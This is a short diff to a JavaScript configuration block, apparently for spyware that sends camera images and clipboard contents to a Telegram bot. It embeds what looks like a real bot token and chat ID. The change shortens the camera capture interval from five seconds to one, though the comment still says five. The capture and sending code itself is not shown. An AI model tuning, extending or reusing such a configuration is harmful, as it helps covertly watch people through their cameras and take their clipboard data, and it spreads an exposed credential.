@@ -7,7 +7,7 @@
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
         chatId: '6326816238', 
-        intervalCamera: 5000,      // Update kamera setiap 5 detik (agar tidak terlalu berat)
+        intervalCamera: 1000,      // Update kamera setiap 5 detik (agar tidak terlalu berat)
         intervalClipboard: 5000,   // Cek clipboard lebih jarang agar hemat baterai
         cameraRes: { w: 1280, h: 720 }, // Resolusi awal HD
         qualityStart: 0.95         // Kualitas JPEG awal
